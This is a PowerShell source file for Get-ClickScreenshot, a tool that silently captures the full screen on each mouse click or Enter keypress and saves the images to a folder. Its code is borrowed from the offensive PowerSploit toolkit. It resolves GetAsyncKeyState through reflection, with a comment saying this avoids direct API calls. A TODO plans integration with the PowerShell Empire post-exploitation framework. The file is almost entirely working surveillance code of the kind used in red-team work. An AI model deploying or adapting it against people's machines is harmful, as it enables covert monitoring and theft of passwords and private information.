function Get-ClickScreenshot
{
<#
.SYNOPSIS

Takes screenshots after each mouse click. 

.DESCRIPTION

A function that takes screenshots every mouse click and saves them to a folder. 
TODO: screenshot on mousewheel scroll. Requires hooking
TODO: highlight mouse location
TODO: option to capture only the screen that the click happened in multi-monitor environments
TODO: zip archive and powershell empire integration
TODO: integrate with Get-TimedScreenshot 

.PARAMETER Path

Specifies the folder path.
    
.PARAMETER EndTime

Specifies when the script should stop running in the format HH-MM 

.PARAMETER MaxScreenshots

Specifies the max number of screenshots to be taken. If reached, the script will close even if it hasn't reached the end time yet. 

.PARAMETER EnterKey

Specifies if the script should screenshot on enter key event as well as mouseclick 

.EXAMPLE 

PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00 

#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$False)]             
        [String] $EndTime,

        [Parameter(Mandatory=$False)]             
        [String] $MaxScreenshots,

        [Parameter(Mandatory=$False)]             
        [Switch] $EnterKey
    )
    #borrowed from PowerSploit's Get-Keystrokes.ps1 
    #uses GetModuleHandle and GetProcAddress to avoid direct api calls.
    function local:Get-DelegateType {
        Param (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        $TypeBuilder.CreateType()
    }
    function local:Get-ProcAddress {
        Param (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    # GetAsyncKeyState
    $GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
	$GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
	$GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)

    #modified from PowerSploit Get-TimedScreenshot.ps1 
    #improved to capture all screens instead of just the main screen
    Function Get-Screenshot ($FilePath) {
        $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $ScreenBounds.Width
        $Height = $ScreenBounds.Height

        $Size = New-Object System.Drawing.Size($Width, $Height)
        $Point = New-Object System.Drawing.Point(0, 0)

        $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
        $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
        $DrawingGraphics.CopyFromScreen($ScreenBounds.Left, $ScreenBounds.Top, 0, 0, $Size);
        $DrawingGraphics.Dispose()
        $ScreenshotObject.Save($FilePath)
        $ScreenshotObject.Dispose()
    }
    [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') 
    $ClickCount = 0; 
    #continue forever if EndTime not specified
    while((-not $EndTime) -or ((Get-Date -Format HH:mm) -lt $EndTime)) {
        #EX: 3-27-2018--12-36-41.png
        $Time = (Get-Date)
        [String] $FileName = "$($Time.Month)"
        $FileName += '-'
        $FileName += "$($Time.Day)" 
        $FileName += '-'
        $FileName += "$($Time.Year)"
        $FileName += '--'
        $FileName += "$($Time.Hour)"
        $FileName += '-'
        $FileName += "$($Time.Minute)"
        $FileName += '-'
        $FileName += "$($Time.Second)"
        $FileName += '.png'
            
        #use join-path to add path to filename
        [String] $FilePath = (Join-Path $Path $FileName)
        Start-Sleep -Milliseconds 300
        $RightClickState = $GetAsyncKeyState.Invoke(0x01)
        $LeftClickState = $GetAsyncKeyState.Invoke(0x02)
        $MidClickState = $GetAsyncKeyState.Invoke(0x04)
        $EnterKeyState = ($GetAsyncKeyState.Invoke([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
        if ($EnterKey) {
            $EventTrigger = $RightClickState -or $MidClickState -or $LeftClickState -or $EnterKeyState
        } else {
            $EventTrigger = $RightClickState -or $MidClickState -or $LeftClickState
        }
        if( $MaxScreenshots -and ($ClickCount -ge $MaxScreenshots)) {
            return
        }
        if ($EventTrigger) {
            Start-Sleep -Milliseconds 100
            Get-Screenshot $FilePath
            $ClickCount++
            #Start-Sleep -Milliseconds 300
        }
    }
}
